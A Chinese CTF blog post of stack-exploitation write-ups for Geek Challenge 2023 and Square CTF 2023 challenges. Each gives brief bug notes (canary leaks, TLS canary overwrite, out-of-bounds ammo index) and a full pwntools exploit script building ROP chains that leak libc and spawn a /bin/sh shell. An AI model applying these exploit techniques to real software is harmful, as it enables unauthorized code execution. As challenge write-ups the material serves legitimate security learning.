# Stack Challenge


该文用于收录一些比赛时不会的栈题目，仅记录一些做题思路。

&lt;!--more--&gt;

## geek challenge 2023

### ez_fullprotection

首先在game 中输入 字符 跳过scanf 输入，这样后面printf 就会泄露程序基址，后面创建的子进程函数中存在栈溢出，输入一长串字符串即可劫持TLS绕过canary。

![image-20231130170057752](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001078.png)

```py
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;pwn.node.game.sycsec.com&#34;,31009)
p=process(&#39;./ez_fullprotection&#39;)
libc=ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def mydbg():
    gdb.attach(p,&#34;b *$rebase(0x101a)&#34;)
    pause()

ru(&#34;Tell me your name: &#34;)
sl(&#34;aaaa&#34;)
#mydbg()
ru(&#34;Enter your guess : &#34;)
s(&#34;a&#34;)
ru(&#34;but you entered &#34;)
elf_base=int(rn(14),10)-0x001240
pop_rdi=elf_base&#43;0x00000000000016e3
pop_rsi=elf_base&#43;0x00000000000016e1
pop_addr=elf_base&#43;0x16DA
mov_addr=elf_base&#43;0x16C0
puts_plt=0x001150&#43;elf_base
puts_got=elf_base&#43;0x3F60 
gets_plt=elf_base&#43;0x11C0
bss=elf_base&#43;0x04e08
pop_rsp=elf_base&#43;0x00000000000016dd
ret=elf_base&#43;0x000000000000101a

ru(&#34;Don&#39;t lose heart&#34;)
s(&#34;\n&#34;)

lg(&#34;elf_base&#34;)
ru(&#34;This should work.\n&#34;)
ru(&#34;&gt; &#34;)

payload=b&#39;a&#39;*0x38&#43;p64(pop_rdi)&#43;p64(puts_got)&#43;p64(puts_plt)&#43;p64(pop_rdi)&#43;p64(bss)&#43;p64(gets_plt)&#43;p64(pop_rsp)&#43;p64(bss-0x18)
payload=payload.ljust(0xa00,b&#34;a&#34;)
sl(payload)

libc_base=uu64()-libc.sym[&#39;puts&#39;]
lg(&#34;libc_base&#34;)
pop_rdx=libc_base&#43;0x0000000000142c92
sys=libc_base&#43;libc.sym[&#39;execve&#39;]
binsh=bss&#43;0x40
payload=p64(pop_rdi)&#43;p64(binsh)&#43;p64(pop_rsi)&#43;p64(0)*2&#43;p64(pop_rdx)&#43;p64(0)&#43;p64(sys)&#43;b&#34;/bin/sh\x00&#34;
sl(payload)
p.interactive()
```

### elevator

v1[0] 未初始化，因此我们可以通过alloca抬高栈，让v1[0]恰好指向残留的canary，然后输入字符，即可绕过scanf的读入，接下来printf 进行泄露。

![image-20231130170423826](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001079.png)

```py
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;pwn.node.game.sycsec.com&#34;,31707)

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def mydbg():
    gdb.attach(p)
    pause()



while True:
    p=process(&#39;./elevator&#39;)
    libc=ELF(&#34;./libc.so.6&#34;)
    ru(&#34;Tell me your name so i can let you in:&#34;)
    sl(&#34;a&#34;*0x58)

    ru(&#34;Please enter the floor you want to reach:&#34;)
    #mydbg()
    sl(&#34;23&#34;)

    ru(&#34;How long do you think you have to wait?&#34;)

    sl(&#34;-&#34;)
    msg=ru(&#34;!&#34;)
    if b&#39;bad&#39; in msg:
        p.close()
        continue
    float_num=ru(&#34;s&#34;)[:-1]
    if b&#39;-0.000000&#39; in float_num or  b&#39;0.000000&#39; in float_num:
        p.close()
        continue
    break
canary=struct.pack(&#34;&lt;d&#34;, eval(float_num))
canary=u64(canary)
lg(&#34;canary&#34;)
ru(&#34;I believe you can easily solve this problem.&#34;)
pop_rdi=0x00000000004016f3
puts_plt=0x4010D0
puts_got=0x404020
read_addr=0x401521
bss=0x404a08
payload=b&#39;a&#39;*0x28&#43;p64(canary)&#43;p64(bss)&#43;p64(pop_rdi)&#43;p64(puts_got)&#43;p64(puts_plt)&#43;p64(read_addr)
#mydbg()
sl(payload)


libc_base=uu64()-libc.sym[&#39;puts&#39;]
sys=libc_base&#43;libc.sym[&#39;system&#39;]
binsh=libc_base&#43;next(libc.search(b&#34;/bin/sh&#34;))
payload=b&#39;a&#39;*0x28&#43;p64(canary)&#43;p64(bss)&#43;p64(pop_rdi)&#43;p64(binsh)&#43;p64(sys)
sl(payload)

p.interactive()
```

## Square ctf2023

### super-sick-tank-game

程序模拟了一个tank 游戏，通过srand 生成一个靶子位置，你可以通过角度和力量操纵子弹的落地位置，这样我们就可以通过靶子的位置，然后选择适当的角度和力量去击中该靶子，并覆写该位置为子弹的值，当连续击中靶子3次之后，我们可以获得特殊弹药`-`，该弹药可在目标的±1 位置均覆写为子弹的值。因此我们可以用来覆写max_power 和max_angel。这样我们就可以前向覆盖一些变量的值（因为cos90-cos180 为负数），如覆盖miss_ctr ，增加我们miss的次数。

![image-20231130171004800](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001080.png)

接下来覆写num_ammo_types ，也就是下图中的2，这里是ida反编译错误，实际应该为变量num_ammo_types 。我们覆写num_ammo_types 为一个大值。



![image-20231130171557573](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001081.png)

![image-20231130171718648](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001082.png)



接下来计算好返回地址与field的偏移即可覆盖返回地址了，但是ammo_types 只有2种取值，是无法覆盖到后门函数的。注意到current_ammo_types 是通过ammo_types[selection-1]取值的，而我们上面已经可以输入一个大于2的selection ，这样就存在一个数组越界。注意到我们可以反复向input_buf 输入，输入&#34;pew!&#34;跳出循环。

通过在&#34;pew!&#34;的第一个strcmp检查中&#34;失败&#34;，而发送&#34;AAAAAA&#34; &#43;  1个任意字节来将任意字节加载到内存中。当你在下一轮循环中发送&#34;pew!&#34;时，前6个&#34;a&#34;会被&#34;pew!\n\x00&#34;覆盖，但最后一个字节将保留在内存中，供下一轮的弹药类型选择使用。

那么我们可以通过ammo_types[9-1]来取出残留的任意字节值，然后对返回地址进行覆盖。

![image-20231130172004401](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001083.png)

![image-20231130172302512](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001084.png)

完成对返回地址的覆写后，将miss_ctr 覆盖成一个较小的值，然后耗尽所有miss_ctr 退出即可

```python
from pwn import*
from ctypes import CDLL
from math import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;184.72.87.9&#34;,8004)
p=process(&#39;./super-sick-tank-game&#39;)
libc=ELF(&#39;./libc.so.6&#39;)
mylibc=CDLL(&#34;./libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
    gdb.attach(p)
    pause()


def myfun(num,max_power=33,max_ange=90):
    if max_ange&gt;180:
        max_ange=180
    #log(&#34;max_ange&#34;)
    #log(&#34;max_power&#34;)
    for v0 in range(0,max_power&#43;1):
        for theta in range(0,max_ange&#43;1):
            thetaRad = 3.141592653589793 * theta / 180.0;
            vx = cos(thetaRad) * v0;
            vy = sin(thetaRad) * v0;
            result=(vx * ((vy &#43; vy) / 9.81))
            if int(result)==num:
                print(&#34;v0==&#34;&#43;str(v0)&#43;&#34;theta==&#34;&#43;str(theta))
                return v0,theta


def shot(ammo_type=1):
    result=(mylibc.rand())%0x70-1
    print(&#34;result==&#34;&#43;str(result))
    power,angle=myfun(result)
    ru(&#34;|100m\n&#34;)
    first_line=p.recvline()
    if first_line==b&#34;Hit Streak! 1 specialty ammo granted\n&#34;:
        log,info(&#34;&#43;1 specialty ammo&#34;)
        ru(&#34;Select ammo type:\n1: _\n2: -&#34;)
        sl(str(ammo_type))
    sl(str(power))
    ru(&#34;Enter angle: &#34;)
    sl(str(angle))
    ru(&#34;fire when ready!&#34;)
    sl(&#34;pew!&#34;)

def shot_change(result,ammo_type,max_power=33,max_ange=90,byte=b&#39;\x00&#39;):
    print(&#34;max_power&#34;&#43;str(max_power)&#43;&#34;\n max_ange=&#34;&#43;str(max_ange))
    power,angle=myfun(result,max_power,max_ange)
    ru(&#34;Select ammo type:\n1: _\n2: -&#34;)
    sl(str(ammo_type))
    ru(&#34;Enter power: &#34;)
    sl(str(power))
    ru(&#34;Enter angle: &#34;)
    sl(str(angle))
    ru(&#34;fire when ready!&#34;)
    sl(b&#34;pew!AA&#34;&#43;byte)
    sl(&#34;pew!&#34;)


ru(&#34;welcome to the super sick tank game! survive for as long as you can!&#34;)

now=int(time.time())
mylibc.srand(now)

for i in range(10):
    shot()


max_power_offset=0x70
max_ange_offset=-0x4
shot_change(max_power_offset-1,2)
shot_change(0,2)

max_power=45
max_ange=0x2d00005a
miss_offset=-0x12c
shot_change(max_power_offset&#43;3,2,max_power,max_ange)
max_power=10000

shot_change(miss_offset-1,2,max_power,max_ange)

num_ammo_types_num_offset=-0x118
backdoor=0x4013E3

shot_change(num_ammo_types_num_offset,1,max_power,max_ange,p8(backdoor&amp;0xff))
ret_offset=0x90
shot_change(ret_offset,9,max_power,max_ange,p8((backdoor&gt;&gt;8)&amp;0xff))
shot_change(ret_offset&#43;1,9,max_power,max_ange,p8(1))
shot_change(miss_offset,9,max_power,max_ange)
shot_change(0,1,max_power,max_ange)
shot_change(0,1,max_power,max_ange)
#mydbg()

shot_change(0,1,max_power,max_ange)
#mydbg()



p.interactive()
```

### super-sick-tank-game-bonus

相较于上一题删除了后门函数，因此我们需要泄露libc地址，return2libc即可。

那么我们在上题的基础上修改heart 为puts函数的got 表，即可泄露libc。

![image-20231130172720591](https://cdn.jsdelivr.net/gh/chuw3i/picodemo/img/202501050001085.png)

```python
from pwn import*
from ctypes import CDLL
from math import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;184.72.87.9&#34;,8004)
p=process(&#39;./super-sick-tank-game-bonus&#39;)
libc=ELF(&#39;./libc.so.6&#39;)
mylibc=CDLL(&#34;./libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
    gdb.attach(p,&#34;b *0x4016D0&#34;)
    pause()


def myfun(num,max_power=33,max_ange=90):
    if max_ange&gt;180:
        max_ange=180
    #log(&#34;max_ange&#34;)
    #log(&#34;max_power&#34;)
    for v0 in range(0,max_power&#43;1):
        for theta in range(0,max_ange&#43;1):
            thetaRad = 3.141592653589793 * theta / 180.0;
            vx = cos(thetaRad) * v0;
            vy = sin(thetaRad) * v0;
            result=(vx * ((vy &#43; vy) / 9.81))
            if int(result)==num:
                print(&#34;v0==&#34;&#43;str(v0)&#43;&#34;theta==&#34;&#43;str(theta))
                return v0,theta


def shot(ammo_type=1):
    result=(mylibc.rand())%0x70-1
    print(&#34;result==&#34;&#43;str(result))
    power,angle=myfun(result)
    ru(&#34;|100m\n&#34;)
    first_line=p.recvline()
    if first_line==b&#34;Hit Streak! 1 specialty ammo granted\n&#34;:
        info(b&#39;&#43;1 specialty ammo&#39;)
        ru(&#34;Select ammo type:\n1: _\n2: -&#34;)
        sl(str(ammo_type))
    sl(str(power))
    ru(&#34;Enter angle: &#34;)
    sl(str(angle))
    ru(&#34;fire when ready!&#34;)
    sl(&#34;pew!&#34;)

def shot_change(result,ammo_type,max_power=33,max_ange=90,byte=b&#39;\x00&#39;):
    print(&#34;max_power&#34;&#43;str(max_power)&#43;&#34;\n max_ange=&#34;&#43;str(max_ange))
    power,angle=myfun(result,max_power,max_ange)
    ru(&#34;Select ammo type:\n1: _\n2: -&#34;)
    sl(str(ammo_type))
    ru(&#34;Enter power: &#34;)
    sl(str(power))
    ru(&#34;Enter angle: &#34;)
    sl(str(angle))
    ru(&#34;fire when ready!&#34;)
    sl(b&#34;pew!AA&#34;&#43;byte)
    sl(&#34;pew!&#34;)


ru(&#34;welcome to the super sick tank game! survive for as long as you can!&#34;)

now=int(time.time())
mylibc.srand(now)

for i in range(40):
    shot()


max_power_offset=0x70
max_ange_offset=-0x4
shot_change(max_power_offset-1,2)
shot_change(0,2)

max_power=45
max_ange=0x2d00005a
miss_offset=-0x12c
shot_change(max_power_offset&#43;3,2,max_power,max_ange)
max_power=10000

shot_change(miss_offset-1,2,max_power,max_ange)

num_ammo_types_num_offset=-0x118
backdoor=0x4013E3
puts_got=0x404018
shot_change(num_ammo_types_num_offset,1,max_power,max_ange,p8(puts_got&amp;0xff))
ret_offset=0x90
heart_offset=-0xf8

shot_change(heart_offset,9,max_power,max_ange,p8((puts_got&gt;&gt;8)&amp;0xff))

shot_change(heart_offset&#43;1,9,max_power,max_ange,p8(3))

shot_change(miss_offset,9,max_power,max_ange,p8(31))
libc_base=uu64()-libc.sym[&#39;puts&#39;]

pr(&#34;libc_base&#34;)
#mydbg()
pop_rdi=libc_base&#43;0x000000000002a3e5
binsh=libc_base&#43;next(libc.search(b&#39;/bin/sh&#39;))
sys=libc_base&#43;libc.sym[&#39;system&#39;]
ret=libc_base&#43;0x0000000000029139
shot_change(miss_offset,9,max_power,max_ange,p8(pop_rdi&amp;0xff))
for i in range(7):
    shot_change(ret_offset&#43;i,9,max_power,max_ange,p8((pop_rdi&gt;&gt;(8*(i&#43;1)))&amp;0xff))
shot_change(ret_offset&#43;7,9,max_power,max_ange,p8(binsh&amp;0xff))
for i in range(7):
    shot_change(ret_offset&#43;8&#43;i,9,max_power,max_ange,p8((binsh&gt;&gt;(8*(i&#43;1)))&amp;0xff))
shot_change(ret_offset&#43;8&#43;7,9,max_power,max_ange,p8(ret&amp;0xff))
for i in range(7):
    shot_change(ret_offset&#43;0x10&#43;i,9,max_power,max_ange,p8((ret&gt;&gt;(8*(i&#43;1)))&amp;0xff))
shot_change(ret_offset&#43;0x10&#43;7,9,max_power,max_ange,p8(sys&amp;0xff))
for i in range(7):
    shot_change(ret_offset&#43;0x18&#43;i,9,max_power,max_ange,p8((sys&gt;&gt;(8*(i&#43;1)))&amp;0xff))
shot_change(ret_offset&#43;0x18&#43;7,9,max_power,max_ange,p8(1))
shot_change(miss_offset,9,max_power,max_ange)
shot_change(0,1,max_power,max_ange)
shot_change(0,1,max_power,max_ange)
lg(&#34;libc_base&#34;)
pr(&#34;libc_base&#34;)
#mydbg()
shot_change(0,1,max_power,max_ange)
p.interactive()
```



---

> 作者: chuwei  
> URL: http://localhost:1313/posts/stack-challenge/  

